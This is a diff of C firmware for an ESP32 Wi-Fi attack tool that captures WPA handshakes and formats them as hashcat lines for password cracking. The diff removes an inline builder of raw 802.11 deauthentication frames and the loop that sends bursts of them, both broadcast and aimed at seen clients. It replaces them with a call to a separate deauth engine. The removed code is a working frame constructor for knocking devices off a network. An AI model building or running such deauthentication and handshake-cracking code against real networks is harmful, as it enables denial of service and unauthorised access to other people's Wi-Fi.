@@ -1,5 +1,6 @@
 #include "wifi_handshake.h"
 #include "wifi_scan.h"
+#include "deauth_engine.h"
 #include "ssd1306.h"
 #include "esp_wifi.h"
 #include "esp_log.h"
@@ -94,20 +95,7 @@ static const m1_record_t *m1_find(const uint8_t *client, const uint8_t *replay) 
     return NULL;
 }
 
-// ---------- deauth frame ----------
-
-static int build_deauth_frame(uint8_t *f, const uint8_t *client) {
-    f[0] = 0xC0; f[1] = 0x00;              // FC: Deauthentication
-    f[2] = 0x3A; f[3] = 0x01;              // Duration
-    memcpy(f +  4, client,       6);        // Addr1: target client (or broadcast)
-    memcpy(f + 10, target_bssid, 6);        // Addr2: AP
-    memcpy(f + 16, target_bssid, 6);        // Addr3: BSSID
-    f[22] = 0x00; f[23] = 0x00;            // Seq control
-    f[24] = 0x07; f[25] = 0x00;            // Reason: Class 3 frame received from non-associated station
-    return 26;
-}
-
-// ---------- save handshake ----------
+// ---------- hashcat line builder ----------
 
 static void build_hashcat_line(const uint8_t *mic, const uint8_t *anonce,
                                const uint8_t *client, const uint8_t *eapol_m2,
@@ -237,11 +225,6 @@ static void promisc_rx(void *buf, wifi_promiscuous_pkt_type_t type) {
 static void hs_task(void *arg) {
     esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
 
-    uint8_t deauth_to_client[26];
-    uint8_t deauth_to_bcast[26];
-    static const uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-    build_deauth_frame(deauth_to_bcast, broadcast);
-
     while (hs_hunting) {
         // Flash any staged handshake to LittleFS
         if (save_ready) {
@@ -254,18 +237,12 @@ static void hs_task(void *arg) {
             deauth_request = false;
             deauth_active  = true;
             hs_refresh     = true;
-            // Send a burst — broadcast + any seen clients on this AP
-            for (uint8_t i = 0; i < DEAUTH_BURST_N && hs_hunting; i++) {
-                // Half broadcast, half targeted at last-seen clients (if any)
-                if ((i & 1) == 0 || cap_count == 0) {
-                    esp_wifi_80211_tx(WIFI_IF_STA, deauth_to_bcast, 26, false);
-                } else {
-                    build_deauth_frame(deauth_to_client, captures[cap_count - 1].client_mac);
-                    esp_wifi_80211_tx(WIFI_IF_STA, deauth_to_client, 26, false);
-                }
-                deauth_sent++;
-                vTaskDelay(pdMS_TO_TICKS(DEAUTH_GAP_MS));
-            }
+
+            const uint8_t *client = (cap_count > 0)
+                ? captures[cap_count - 1].client_mac : NULL;
+            deauth_sent += deauth_engine_burst(target_bssid, target_channel,
+                                               client, DEAUTH_BURST_N, DEAUTH_GAP_MS);
+
             deauth_active = false;
             hs_refresh    = true;
         }
